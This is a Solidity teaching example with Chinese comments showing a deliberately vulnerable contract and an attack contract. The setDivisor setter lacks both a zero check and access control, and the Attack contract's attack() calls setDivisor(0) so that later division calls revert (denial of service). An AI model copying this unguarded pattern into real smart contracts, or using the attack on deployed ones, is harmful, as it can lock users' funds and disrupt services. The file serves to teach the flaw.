// Vulnerability Code (漏洞程式碼)
// 本程式碼示範一個 Division Bugs 漏洞，主要問題在於沒有檢查除數是否為0
// 攻擊步驟:
// 1. 攻擊者呼叫 setDivisor(0) ，將除數設為0。
// 2. 如果有依賴 getDivision/distribute 函式進行金額分配，則會因為除以0而發生錯誤 (DoS 攻擊)，使合約運作失敗。

pragma solidity >=0.8.0;

// 主合約 - 漏洞程式碼
contract DivBugVulnerable {
    uint public numerator;       // 被除數
    uint public divisor;         // 除數，漏洞重點：未對0進行檢查
    address public owner;

    constructor(uint _numerator) {
        owner = msg.sender;
        numerator = _numerator;
        divisor = 1; // 初始值不可為0，否則直接除法就會錯誤
    }

    // vulnerable function: 設定除數，沒檢查是否為0
    function setDivisor(uint _divisor) public {
        divisor = _divisor; // 漏洞：未檢查 _divisor 是否為0
    }

    // vulnerable division operation: 使用除法計算
    function getDivision() public view returns (uint) {
        // 漏洞：當 divisor 為0時，執行 numerator/divisor 會 revert
        return numerator / divisor;
    }

    // 假設一個依賴除法計算分配的函式，例如獲得某種 reward
    function distribute() public view returns (uint) {
        // 若 divisor 被攻擊者設為0，則整個分配流程會因除法錯誤而被中斷，造成 DoS
        return numerator / divisor;
    }
}

// 攻擊合約 - 利用漏洞執行攻擊
contract Attack {
    DivBugVulnerable public target;

    // 部署攻擊合約時需傳入目標合約位址
    constructor(address _target) {
        target = DivBugVulnerable(_target);
    }

    // 攻擊方法: 呼叫漏洞函式將 divisor 設為 0
    function attack() public {
        // 這裡將除數設定為0，未來任何依賴分配計算的呼叫都會因 division by zero 而失敗
        target.setDivisor(0);
    }
}

/*
補充說明：
在此漏洞範例中，攻擊者可以利用 setDivisor 函式將除數設為0，當系統在進行 reward 或其他依賴除法運算時 (例如 distribute 函式)，
就會因為 division by zero 而導致交易 revert，造成服務中斷或其他業務流程受阻。
*/